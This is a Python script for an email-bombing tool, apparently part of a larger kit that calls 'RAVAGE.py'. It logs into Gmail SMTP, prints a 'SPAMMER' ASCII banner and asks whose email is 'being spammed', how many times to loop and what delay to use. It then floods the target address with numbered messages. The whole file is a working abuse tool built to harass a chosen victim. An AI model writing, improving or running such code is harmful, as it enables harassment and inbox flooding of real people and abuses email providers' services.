import time
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
import colorama
from colorama import Fore
#--------------------------------------------------------------------------------
def clear_console():
    os.system('clear') 
#--------------------------------------------------------------------------------
 
#--------------------------------------------------------------------------------
  
#--------------------------------------------------------------------------------
def Run(pe, password):
    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.ehlo()
    smtp.starttls()
    print(Fore.BLUE+"██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████")
    print("█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███")
    print("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███")
    print("█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███")
    print("█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░████░░▄▀░░███")
    print("█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███")
    print("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███")
    print("█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░░░░░██░░▄▀░░█░░▄▀░░██░░░░░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███")
    print("█████████░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█░░▄▀░░██████████░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████")
    print("█░░░░░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█░░▄▀░░██████████░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█")
    print("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█░░▄▀░░██████████░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█")
    print("█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░██░░░░░░█░░░░░░██████████░░░░░░█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█")
    print("██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████")

    smtp.login(pe, password)
    number = 0
    
    detect = input(Fore.WHITE+'Start Program? Yes/No >>> ') #Create input check to start code

    if ((detect == 'Yes') or (detect == 'yes')):
        email = input("Who's Email Is Being Spammed >>>") #Create input check to start code
        loopAmmount = input('How Many Times Should This Loop? >>> ') #Create input check to start code
        print(f'This Will Loop {loopAmmount} Times')
        delayInput = input('How Many Seconds Of Delay Should There Be Between Each Email? >>> ')
        time.sleep(1)
        print(f'There Will Be {delayInput} Seconds Of Delay Between Each Email')
        print('Starting In 3 Seconds...')
        time.sleep(1)
        print('Starting In 2 Seconds...')
        time.sleep(1)
        print('Starting In 1 Seconds...')
        time.sleep(1)
        print('Starting...')
        converted_num = int(loopAmmount)
        delay = int(delayInput)

        time.sleep(2)

        while converted_num >= 1:
#-----------------------------------------------------------------------------------------Program Being Looped V----
            number = number + 1

            text = (f'{number}')
            subject = ''

            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg.attach(MIMEText(text))

            to = [f"{email}"]

            smtp.sendmail(from_addr=pe,
              to_addrs=to, msg=msg.as_string())

            print(f'Email Number {number} Is Being Sent')
            
            time.sleep(delay)
#-------------------------------------------------------------------------------------------------------------------------------------
            converted_num = converted_num - 1
            if converted_num == 0:
                os.system('python RAVAGE.py')
                break
                
#-------------------------------------------------------------------------------^---------------------------------------------------
    elif ((detect == 'No') or (detect == 'no')):
        quit()

    else:
        clear_console() #Clear Console
        print('Please Choose Option')
        Run()
#--------------------------------------------------------------------------------
